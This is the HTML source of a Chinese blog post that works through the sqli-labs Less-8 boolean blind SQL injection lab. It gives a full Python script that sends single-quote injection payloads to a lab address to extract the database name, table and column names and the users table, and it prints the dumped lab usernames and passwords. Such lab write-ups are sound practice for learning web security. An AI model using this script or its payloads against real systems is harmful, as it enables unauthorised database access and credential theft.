@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>sqli-labs8 编写脚本进行注入 | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sqli-labs,sql注入,盲注,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>sqli-labs8 编写脚本进行注入</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-04-04
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less -8"></a>Less -8</h3><blockquote>
+<p><a href="http://43.247.91.228:84/Less-8/" target="_blank" rel="noopener">地址</a></p>
+</blockquote>
+<p>本题的题目是Blind-Boolian Based-Single Quotes<br>地址后添加?id=1，回显<code>Welcome    Dhakkan You are in...........</code><br>再加上单引号后只有 <code>Welcome    Dhakkan</code>推测是使用了单引号<br>使用<code>0&#39; or 1=1 --+</code>返回正常，所以推测是使用单引号进行闭合，所以这里的注入过程应该和Less-5 一样，这一关是根据是否出现<code>You are in...........</code>来判断是否正确。</p>
+<p>这次尝试写个脚本注入，最终能后获得数据库<code>users</code>表中所有数据的内容，参考了网上一些这一关脚本的写法，主要是猜解字符串的长度和具体字符，原理就是重复提交修改后的url，判断网页返回内容中是否有<code>You are in .........</code>，其中为了使输出结果清晰，注入过程的输出都进行了注释。</p>
+<h3 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://43.247.91.228:84/Less-8/?id="</span></span><br><span class="line">right_text=<span class="string">"You are in..........."</span></span><br><span class="line">table_names=[]</span><br><span class="line">cols=[]</span><br><span class="line">data=[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取名字长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(check_name,limit=<span class="string">""</span>)</span>:</span></span><br><span class="line">	length=<span class="number">0</span>;	</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		newurl=<span class="string">"1' and length("</span>+check_name+limit+<span class="string">")="</span>+str(length)+<span class="string">"#"</span></span><br><span class="line">		response = request.urlopen(url + parse.quote(newurl)).read().decode()</span><br><span class="line">		<span class="comment"># print(url+newurl)</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">return</span> length</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			length+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_name</span><span class="params">(namelength,check_name,limit=<span class="string">""</span>)</span>:</span></span><br><span class="line">	name=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(namelength):</span><br><span class="line">		a,b=<span class="number">64</span>,<span class="number">64</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			b=int(b/<span class="number">2</span>)</span><br><span class="line">			newurl=<span class="string">"1' and ascii(substr("</span>+check_name+limit+<span class="string">","</span>+str(i+<span class="number">1</span>)+<span class="string">")"</span>+<span class="string">")&lt;"</span>+str(a)+<span class="string">"#"</span></span><br><span class="line">			<span class="comment"># print(url+newurl)</span></span><br><span class="line">			<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">				a-=b</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				newurl=<span class="string">"1' and ascii(substr("</span>+check_name+limit+<span class="string">","</span>+str(i+<span class="number">1</span>)+<span class="string">")"</span>+<span class="string">")="</span>+str(a)+<span class="string">"#"</span></span><br><span class="line">				<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">					name+=chr(a)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					a+=b</span><br><span class="line">	<span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取表的数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_table_nums</span><span class="params">(check_name)</span>:</span></span><br><span class="line">	table_nums=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		limit=<span class="string">" limit "</span>+str(table_nums)+<span class="string">",1"</span></span><br><span class="line">		newurl=<span class="string">"1' and ascii(substr("</span>+check_name+limit+<span class="string">"),1))&gt;0"</span>+<span class="string">"#"</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			table_nums+=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> table_nums</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中列的数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_column_nums</span><span class="params">(table_name)</span>:</span></span><br><span class="line">	nums=<span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		newurl=<span class="string">"1' and (select count(*) from information_schema.COLUMNS where table_name='"</span>+str(table_name)+<span class="string">"') ="</span>+str(nums)+<span class="string">"#"</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">return</span> nums</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			nums+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_names</span><span class="params">(check_name,nums,names)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> n  <span class="keyword">in</span> range(nums):</span><br><span class="line">		<span class="comment">#获取长度</span></span><br><span class="line">		limit=<span class="string">" limit "</span>+str(n)+<span class="string">",1)"</span></span><br><span class="line">		length=get_length(check_name,limit)</span><br><span class="line">		<span class="comment"># print("[+]长度为:"+str(length))</span></span><br><span class="line">		<span class="comment">#获取名字</span></span><br><span class="line">		name=guess_name(length,check_name,limit)</span><br><span class="line">		names.append(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取相应表中有多少数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data_nums</span><span class="params">(DBname,table_name,cols)</span>:</span></span><br><span class="line">	nums=<span class="number">0</span></span><br><span class="line">	columns=<span class="number">0</span></span><br><span class="line">	<span class="comment"># 获取有多少列</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		column=cols[<span class="number">0</span>]</span><br><span class="line">		newurl=<span class="string">"1' and (select count(*) from %s.%s)=%s #"</span> %(DBname,table_name,nums)</span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			nums+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> nums</span><br><span class="line"><span class="comment"># 获取每一条数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(DBname,table_name,cols,data_nums)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cols)):</span><br><span class="line">		print(<span class="string">"[*] "</span>+cols[i]+<span class="string">"列的数据为:"</span>)</span><br><span class="line">		check_name=<span class="string">" (select %s from security.users "</span> % (cols[i])</span><br><span class="line">		get_names(check_name,data_nums,data)</span><br><span class="line">		<span class="keyword">for</span> n <span class="keyword">in</span> range(data_nums):</span><br><span class="line">			print(<span class="string">"-------"</span>+data[n])</span><br><span class="line">		<span class="keyword">del</span> data[:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(newurl)</span>:</span></span><br><span class="line">	<span class="comment"># print(url+newurl)</span></span><br><span class="line">	response = request.urlopen(url + parse.quote(newurl)).read().decode()</span><br><span class="line">	<span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>,response)):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">DBnamelength=get_length(<span class="string">"database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 数据库长度为:"</span> + str(DBnamelength))</span><br><span class="line">print(<span class="string">"[+] 开始获取数据库名字"</span>)</span><br><span class="line">DBname=guess_name(DBnamelength,<span class="string">"database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 数据库名字为:"</span>+ DBname)</span><br><span class="line">table_nums=get_table_nums(<span class="string">"(select table_name from information_schema.tables where table_schema=database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 表的数量为:"</span>+str(table_nums))</span><br><span class="line">print(<span class="string">"[+] 开始获取表名"</span>)</span><br><span class="line">get_names(<span class="string">"(select table_name from information_schema.tables where table_schema=database()"</span>,table_nums,table_names)</span><br><span class="line">print(<span class="string">"[+] 开始获取users表的列名"</span>)</span><br><span class="line">column_nums=get_column_nums(<span class="string">"users"</span>)</span><br><span class="line">get_names(<span class="string">"(select column_name from information_schema.columns where table_name='users'"</span>,column_nums,cols)</span><br><span class="line">data_nums=get_data_nums(DBname,<span class="string">"users"</span>,cols)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] 当前数据库名字为:"</span>+ DBname)</span><br><span class="line">print(<span class="string">"[*] 表的数量为:"</span>+str(table_nums))</span><br><span class="line">print(<span class="string">"[*] 所有表的名字为:"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table_nums):</span><br><span class="line">	print(<span class="string">"		"</span>+table_names[i])</span><br><span class="line">print(<span class="string">"[*] users表一共有"</span>+str(column_nums)+<span class="string">"列"</span>)</span><br><span class="line">print(<span class="string">"[*] users表下所有列的名字为"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(column_nums):</span><br><span class="line">	print(<span class="string">"		"</span>+cols[i])</span><br><span class="line">	</span><br><span class="line">get_data(DBname,<span class="string">"users"</span>,cols,data_nums)</span><br></pre></td></tr></table></figure>
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>运行后的结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">[*] 数据库长度为:8</span><br><span class="line">[+] 开始获取数据库名字</span><br><span class="line">[*] 数据库名字为:security</span><br><span class="line">[*] 表的数量为:4</span><br><span class="line">[+] 开始获取表名</span><br><span class="line">[+] 开始获取users表的列名</span><br><span class="line">[*] 当前数据库名字为:security</span><br><span class="line">[*] 表的数量为:4</span><br><span class="line">[*] 所有表的名字为:</span><br><span class="line">		emails</span><br><span class="line">		referers</span><br><span class="line">		uagents</span><br><span class="line">		users</span><br><span class="line">[*] users表一共有3列</span><br><span class="line">[*] users表下所有列的名字为</span><br><span class="line">		id</span><br><span class="line">		username</span><br><span class="line">		password</span><br><span class="line">[*] id列的数据为:</span><br><span class="line">-------1</span><br><span class="line">-------2</span><br><span class="line">-------3</span><br><span class="line">-------4</span><br><span class="line">-------5</span><br><span class="line">-------6</span><br><span class="line">-------7</span><br><span class="line">-------8</span><br><span class="line">-------9</span><br><span class="line">-------10</span><br><span class="line">-------11</span><br><span class="line">-------12</span><br><span class="line">-------14</span><br><span class="line">[*] username列的数据为:</span><br><span class="line">-------Dumb</span><br><span class="line">-------Angelina</span><br><span class="line">-------Dummy</span><br><span class="line">-------secure</span><br><span class="line">-------stupid</span><br><span class="line">-------superman</span><br><span class="line">-------batman</span><br><span class="line">-------admin</span><br><span class="line">-------admin1</span><br><span class="line">-------admin2</span><br><span class="line">-------admin3</span><br><span class="line">-------dhakkan</span><br><span class="line">-------admin4</span><br><span class="line">[*] password列的数据为:</span><br><span class="line">-------Dumb</span><br><span class="line">-------I-kill-you</span><br><span class="line">-------p@ssword</span><br><span class="line">-------crappy</span><br><span class="line">-------stupidity</span><br><span class="line">-------genious</span><br><span class="line">-------mob!le</span><br><span class="line">-------admin</span><br><span class="line">-------admin1</span><br><span class="line">-------admin2</span><br><span class="line">-------admin3</span><br><span class="line">-------dumbo</span><br><span class="line">-------admin4</span><br><span class="line">[Finished in 177.7s]</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>具体写出来的注入脚本逻辑并不复杂，就是先判断长度，再使用二分法挨个猜解每一位，判断依据就是页面的返回值，判断依据也可以修改，可以使用基于时间的盲注来进行判断，编写脚本的主要难点就是要熟悉各种基本的注入语句，任何一处都不要写错，可以把每个测试的URL都打印出来，方便查错。</p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/4a1095d8.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/sqli-labs/">
+              #sqli-labs
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/sql注入/">
+              #sql注入
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/盲注/">
+              #盲注
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/8b8fd3ef.html" target="_self">XSS challengs 12-15 通关记录</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/bf579251.html" target="_self">sqli-labs Less9-10 基于时间的盲注</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
